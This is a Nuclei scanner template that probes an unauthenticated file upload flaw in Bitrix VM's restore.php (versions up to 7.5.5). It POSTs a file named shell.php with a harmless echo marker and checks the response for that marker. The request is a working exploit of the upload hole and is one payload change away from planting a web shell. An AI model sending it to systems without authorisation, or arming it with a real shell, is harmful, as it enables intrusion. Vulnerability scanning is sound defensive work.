id: bitrix-vm-restore-upload

info:
  name: Bitrix VM restore.php Arbitrary File Upload (VMBitrix ≤ v7.5.5)
  author: clevergod
  severity: critical
  description: |
    Exploitation of unauthenticated restore.php file upload vulnerability in BitrixVM Bitrix Virtual Appliance ≤ v7.5.5 (public exploit at SartLabs).
  tags: bitrix,vmbitrix,restore,upload,fileupload,cve2022

requests:
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/restore.php"
    headers:
      Content-Type: multipart/form-data; boundary=------NucleiBoundary
    body: |
      ------NucleiBoundary
      Content-Disposition: form-data; name="backup_file"; filename="shell.php"
      Content-Type: application/octet-stream

      <?php echo 'NucleiTest'; ?>
      ------NucleiBoundary--
    matchers:
      - type: word
        name: upload-success
        words:
          - "NucleiTest"